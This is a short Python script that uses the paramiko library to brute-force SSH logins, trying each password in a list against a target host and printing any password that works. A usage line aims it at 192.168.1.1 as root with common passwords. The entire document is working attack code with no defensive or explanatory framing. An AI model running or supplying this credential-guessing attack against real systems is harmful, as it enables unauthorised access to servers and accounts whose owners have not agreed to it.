import paramiko

def ssh_brute_force(target_ip, username, password_list):
    for password in password_list:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target_ip, username=username, password=password, timeout=3)
            print(f"Success! Username: {username}, Password: {password}")
            ssh.close()
            return
        except paramiko.AuthenticationException:
            print(f"Failed: {password}")
        except Exception as e:
            print(f"Error: {e}")
    print("Brute force is failed.")

# Usage
passwords = ["123456", "password", "admin"]
ssh_brute_force("192.168.1.1", "root", passwords)
